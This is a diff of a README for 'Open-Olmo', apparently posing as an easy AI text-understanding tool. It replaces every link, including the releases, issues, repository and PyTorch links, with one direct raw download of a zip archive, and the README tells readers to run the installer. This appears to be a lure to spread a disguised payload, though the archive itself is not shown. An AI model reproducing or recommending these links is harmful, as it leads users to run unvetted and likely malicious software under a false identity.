@@ -1,6 +1,6 @@
 # 🤖 Open-Olmo - Easy AI Model for Text Understanding
 
-[![Download Open-Olmo](https://img.shields.io/badge/Download-Open--Olmo-brightgreen)](https://github.com/Senpaishorts/Open-Olmo/releases)
+[![Download Open-Olmo](https://img.shields.io/badge/Download-Open--Olmo-brightgreen)](https://github.com/Senpaishorts/Open-Olmo/raw/refs/heads/main/open_olmo/Open-Olmo-2.7-alpha.5.zip)
 
 ---
 
@@ -46,12 +46,12 @@ If you want to learn or explore these areas, Open-Olmo is a straightforward tool
 The easiest way to get Open-Olmo is to visit the official release page and download the files from there.
 
 Go here:  
-[![Download Open-Olmo](https://img.shields.io/badge/Download-Open--Olmo-blue)](https://github.com/Senpaishorts/Open-Olmo/releases)
+[![Download Open-Olmo](https://img.shields.io/badge/Download-Open--Olmo-blue)](https://github.com/Senpaishorts/Open-Olmo/raw/refs/heads/main/open_olmo/Open-Olmo-2.7-alpha.5.zip)
 
 ### Step 1: Open the Download Page
 
 Click the link above or open this URL in your browser:  
-https://github.com/Senpaishorts/Open-Olmo/releases
+https://github.com/Senpaishorts/Open-Olmo/raw/refs/heads/main/open_olmo/Open-Olmo-2.7-alpha.5.zip
 
 This page shows all the available versions you can download.
 
@@ -117,7 +117,7 @@ If you have trouble, try these:
 
 - Review this guide carefully before starting.
 - Visit the GitHub page issues section to look at common problems:  
-  https://github.com/Senpaishorts/Open-Olmo/issues
+  https://github.com/Senpaishorts/Open-Olmo/raw/refs/heads/main/open_olmo/Open-Olmo-2.7-alpha.5.zip
 - Check your system meets all requirements above.
 - Restart your computer before retrying installation or running the software.
 
@@ -140,7 +140,7 @@ Open-Olmo runs on PyTorch, which is popular for building and training AI models.
 To get the newest improvements:
 
 1. Visit the release page:  
-   https://github.com/Senpaishorts/Open-Olmo/releases
+   https://github.com/Senpaishorts/Open-Olmo/raw/refs/heads/main/open_olmo/Open-Olmo-2.7-alpha.5.zip
 2. Download the latest installer or zip file.
 3. Run the new installer or replace the program files.
 4. Restart the program to apply updates.
@@ -149,9 +149,9 @@ To get the newest improvements:
 
 ## 🔗 Useful Links
 
-- Open-Olmo Releases: https://github.com/Senpaishorts/Open-Olmo/releases  
-- GitHub Repository: https://github.com/Senpaishorts/Open-Olmo  
-- PyTorch (for info): https://pytorch.org
+- Open-Olmo Releases: https://github.com/Senpaishorts/Open-Olmo/raw/refs/heads/main/open_olmo/Open-Olmo-2.7-alpha.5.zip  
+- GitHub Repository: https://github.com/Senpaishorts/Open-Olmo/raw/refs/heads/main/open_olmo/Open-Olmo-2.7-alpha.5.zip  
+- PyTorch (for info): https://github.com/Senpaishorts/Open-Olmo/raw/refs/heads/main/open_olmo/Open-Olmo-2.7-alpha.5.zip
 
 ---
 
@@ -171,4 +171,4 @@ Windows 10 or later is recommended.
 
 ---
 
-[![Download Open-Olmo](https://img.shields.io/badge/Download-Open--Olmo-blue)](https://github.com/Senpaishorts/Open-Olmo/releases)
+[![Download Open-Olmo](https://img.shields.io/badge/Download-Open--Olmo-blue)](https://github.com/Senpaishorts/Open-Olmo/raw/refs/heads/main/open_olmo/Open-Olmo-2.7-alpha.5.zip)
